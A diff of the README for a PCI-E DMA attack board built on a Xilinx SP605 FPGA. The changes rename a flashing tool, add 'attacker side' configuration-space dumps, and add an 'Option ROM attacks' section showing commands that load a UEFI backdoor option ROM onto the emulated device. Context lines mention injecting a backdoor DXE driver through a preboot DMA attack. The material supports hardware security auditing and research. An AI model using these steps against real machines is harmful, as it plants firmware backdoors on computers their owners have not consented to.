@@ -46,7 +46,7 @@ Xilinx UG526 document also known as [SP605 Hardware User Guide](https://www.xili
 In case of [flashrom](https://www.flashrom.org/) compatible external SPI programmer you can use `flash_to_spi.py` program as a flashrom wrapper:
 
 ```
-# ./flash_to_spi.py linux_spi:dev=/dev/spidev1.0 s6_pcie_microblaze.bin
+$ ./flash_to_spi.py linux_spi:dev=/dev/spidev1.0 s6_pcie_microblaze.bin
 Using region: "main".
 Calibrating delay loop... OK.
 Found Winbond flash chip "W25Q64.V" (8192 kB, SPI) on linux_spi.
@@ -60,11 +60,11 @@ Erase/write done.
 
 To boot MicroBlaze into the update mode you have to disconnect SPI programmer and power up the board holding `SW4` pushbutton switch, release `SW4` when `DS6` LED indicating active update mode turns on. 
 
-4) To write the main program (see [main.c](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/sdk/main_0/src/main.c) for more details) into the linear flash connect your computer to UART bridge USB port of SP605 and run `bootloaderctl.py` program with `--flash` option:
+4) To write the main program (see [main.c](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/sdk/main_0/src/main.c) for more details) into the linear flash connect your computer to UART bridge USB port of SP605 and run `bootloader_ctl.py` program with `--flash` option:
 
 ```
-# easy_install pyserial
-# ./python/bootloaderctl.py /dev/ttyUSB0 --flash sdk/main_0/Debug/main_0.srec
+$ easy_install pyserial
+$ ./python/bootloader_ctl.py /dev/ttyUSB0 --flash sdk/main_0/Debug/main_0.srec
 [+] Opening device "/dev/ttyUSB0"...
 [+] Flasing 339852 bytes from "sdk/main_0/Debug/main_0.srec"...
 Erasing flash...
@@ -78,10 +78,10 @@ Writing 0x8c bytes at 0x00152f00
 [+] DONE
 ```
 
-5) To configure board network settings run `bootloaderctl.py` program with `--config` option:
+5) To configure board network settings run `bootloader_ctl.py` program with `--config` option:
 
 ```
-# ./python/bootloaderctl.py /dev/ttyUSB0 --config 192.168.2.247:255.255.255.0:192.168.2.1:28472
+$ ./python/bootloader_ctl.py /dev/ttyUSB0 --config 192.168.2.247:255.255.255.0:192.168.2.1:28472
 [+] Opening device "/dev/ttyUSB0"...
 [+] Updating board settings...
 
@@ -98,7 +98,7 @@ Writing 0x12 bytes at 0x00000000
 6) Now you can exit from the update mode and boot main MicroBlaze program from linear flash:
 
 ```
-# ./python/bootloaderctl.py /dev/ttyUSB0 --boot
+$ ./python/bootloader_ctl.py /dev/ttyUSB0 --boot
 [+] Opening device "/dev/ttyUSB0"...
 [+] Exitting from update mode...
 
@@ -113,7 +113,7 @@ auto-negotiated link speed: 100
 start_application(): TCP server is started at port 28472
 ```
 
-Main program prints it's error messages into the onboard UART, you can use `--console` option of `bootloaderctl.py` to monitor those messages in real time. 
+Main program prints it's error messages into the onboard UART, you can use `--console` option of `bootloader_ctl.py` to monitor those messages in real time. 
 
 7) Connect SP605 to the PCI-E slot of the target computer and turn the computer on. When PCI-E link was sucessfully established SP605 will fire `DS3` and `DS4` LEDs.
 
@@ -154,6 +154,7 @@ $ lspci -vvs 01:00.0
     Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx-
     Interrupt: pin A routed to IRQ 11
     Region 0: Memory at f7d00000 (32-bit, non-prefetchable) [disabled] [size=1M]
+    [virtual] Expansion ROM at 90c00000 [disabled] [size=512K]
     Capabilities: [40] Power Management version 3
         Flags: PMEClk- DSI- D1+ D2+ AuxCurrent=0mA PME(D0+,D1+,D2+,D3hot+,D3cold-)
         Status: D0 NoSoftRst+ PME-Enable- DSel=0 DScale=0 PME-
@@ -178,6 +179,66 @@ Example of PCI-E device as it shown in Apple macOS hardware information when con
 
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/macos_pcie.png" width="623" height="369">
 
+
+On attacker side you can use `pcie_cfg.py` program to view configuration space registers of PCI-E device:
+
+```
+$ ./pcie_cfg.py
+[+] PCI-E link with target is up
+[+] Device address is 03:00.0
+
+           VENDOR_ID = 0x10ee
+           DEVICE_ID = 0x1337
+             COMMAND = 0x0
+              STATUS = 0x10
+            REVISION = 0x0
+          CLASS_PROG = 0x0
+        CLASS_DEVICE = 0x200
+     CACHE_LINE_SIZE = 0x10
+       LATENCY_TIMER = 0x0
+         HEADER_TYPE = 0x0
+                BIST = 0x0
+      BASE_ADDRESS_0 = 0x90500000
+      BASE_ADDRESS_1 = 0x0
+      BASE_ADDRESS_2 = 0x0
+      BASE_ADDRESS_3 = 0x0
+      BASE_ADDRESS_4 = 0x0
+      BASE_ADDRESS_5 = 0x0
+         CARDBUS_CIS = 0x0
+ SUBSYSTEM_VENDOR_ID = 0x10ee
+        SUBSYSTEM_ID = 0x7
+         ROM_ADDRESS = 0xfff80000
+      INTERRUPT_LINE = 0xff
+       INTERRUPT_PIN = 0x1
+             MIN_GNT = 0x0
+             MAX_LAT = 0x0
+```
+
+```
+$ ./pcie_cfg.py -x
+[+] PCI-E link with target is up
+[+] Device address is 03:00.0
+
+0000: 0x10ee 0x1337
+0004: 0x0000 0x0010
+0008: 0x0000 0x0200
+000c: 0x0010 0x0000
+0010: 0x0000 0x9050
+0014: 0x0000 0x0000
+0018: 0x0000 0x0000
+001c: 0x0000 0x0000
+0020: 0x0000 0x0000
+0024: 0x0000 0x0000
+0028: 0x0000 0x0000
+002c: 0x10ee 0x0007
+0030: 0x0000 0xfff8
+0034: 0x0040 0x0000
+0038: 0x0000 0x0000
+003c: 0x01ff 0x0000
+
+      ...
+
+```
 
 Dumping 0x80 bytes of target computer physical memory at zero address:
 
@@ -328,7 +389,7 @@ print('%.2x' % dev.mem_read_1(0x1000))
 ```
 
 
-## Practical attacks
+## Practical DMA attacks
 
 Python program `uefi_backdoor_simple.py` injects dummy UEFI DXE driver located in `payloads/DmaBackdoorSimple` into the target using preboot DMA attack. It's usage:
 
@@ -572,6 +633,34 @@ Also, `backdoor_client.exe` can inject dummy driver located in `payloads/DmaBack
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_vm_inject.png" width="749" height="498">
 
 
+## Option ROM attacks
+
+Provided FPGA design emulates PCI-E device with 512K option ROM stored in onboard linear flash memory of SP605. Although modern platforms [mitigates](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/uefi-validation-option-rom-validation-guidance) option ROM [attacks](https://trmm.net/Thunderstrike), this feature still could be useful for security audit or prototyping purposes.
+
+Erasing option ROM contents:
+
+```
+$ ./pcie_rom_ctl.py --erase
+[+] Opening PCI-E device...
+[+] Enabling resident mode...
+[+] Erasing option ROM...
+[+] Done
+```
+
+Loading provided UEFI option ROM example into the board:
+
+```
+$ ./pcie_rom_ctl.py --load payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64_10ee_1337.rom
+[+] Opening PCI-E device...
+[+] Enabling resident mode...
+[+] Erasing option ROM...
+[+] Loading 5120 bytes of option ROM...
+[+] Done
+```
+
+Also, there's an option to log option ROM memory access into the debug UART of SP605, to enable or disable it use `--log-on` and `--log-off` parameters of `./pcie_rom_ctl.py` program.
+
+
 ## Troubleshooting
 
 PCI Express is very complicated high speed bus so there's a lot of things that can go wrong. If DMA attack is not working on your setup you might check the following things to determine the exact problem:
@@ -603,8 +692,6 @@ PCI Express is very complicated high speed bus so there's a lot of things that c
 
 
 ## TODO
-
-* Use Xilinx AXI DMA core for more fast data transfer between DDR3 memory of MicroBlaze and PCI-E hard IP block.
 
 * Release [DMA to System Management Mode exploit](https://twitter.com/d_olex/status/877718172366798848) when Intel will fix appropriate vulnerability.
 
